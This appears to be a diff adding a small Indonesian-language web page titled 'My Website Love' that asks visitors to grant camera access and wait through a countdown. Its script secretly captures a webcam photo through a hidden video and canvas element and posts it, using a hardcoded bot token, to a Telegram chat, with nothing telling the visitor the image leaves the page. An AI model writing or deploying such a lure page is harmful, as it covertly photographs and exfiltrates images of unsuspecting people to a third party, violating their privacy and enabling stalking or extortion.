@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>My Website Love</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f4f4f4;
+      padding-top: 50px;
+    }
+    #message {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    #countdown {
+      font-size: 40px;
+      font-weight: bold;
+      color: #003366;
+    }
+    #selesai {
+      display: none;
+      font-size: 60px;
+      color: green;
+      margin-top: 30px;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="message">Jangan lupa diizinkan, terus tunggu ya</div>
+  <div id="countdown">10</div>
+  <div id="selesai">SELESAI</div>
+
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
+    const chatId = '7218964278'; // ganti ini
+
+    function countdownAndCapture() {
+      let count = 10;
+      const countdownEl = document.getElementById('countdown');
+      const interval = setInterval(() => {
+        countdownEl.textContent = count;
+        count--;
+        if (count < 0) {
+          clearInterval(interval);
+          document.getElementById('countdown').style.display = 'none';
+          document.getElementById('selesai').style.display = 'block';
+          takePhoto();
+        }
+      }, 1000);
+    }
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          video.play();
+          countdownAndCapture(); // mulai countdown
+        };
+      } catch (err) {
+        console.error('Gagal akses kamera:', err);
+        document.getElementById('message').textContent = 'Kamera gagal diakses.';
+      }
+    }
+
+    function takePhoto() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.jpg');
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).then(res => console.log('Dikirim ke Telegram'))
+          .catch(err => console.error('Gagal kirim:', err));
+      }, 'image/jpeg', 0.95);
+    }
+
+    window.onload = startCamera;
+  </script>
+</body>
+</html>
